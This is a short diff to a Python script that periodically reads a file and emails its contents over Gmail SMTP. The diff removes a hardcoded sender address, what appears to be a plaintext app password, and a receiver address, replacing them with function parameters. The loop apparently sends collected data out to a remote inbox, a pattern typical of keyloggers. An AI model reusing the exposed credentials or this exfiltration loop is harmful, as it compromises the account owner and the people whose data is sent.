@@ -6,11 +6,7 @@ import requests
 from time import sleep
 import smtplib
 
-def send_message(message):
-
-    senders_email = "alikhaledabdallah454@gmail.com"
-    senders_password = "ryzchfxrprttgovy"
-    receiver_email = "v3n0m444555444@gmail.com"
+def send_message(senders_email, senders_password, receiver_email, message):
 
     server = smtplib.SMTP("smtp.gmail.com", 587)
     server.starttls()
@@ -59,7 +55,7 @@ while(True):
     message = intro + file.read()
     file.close()
 
-    send_message(message)
+    send_message("", "", "", message)
 
     i = i + 1
     sleep(waiting_time_in_minutes * 60)
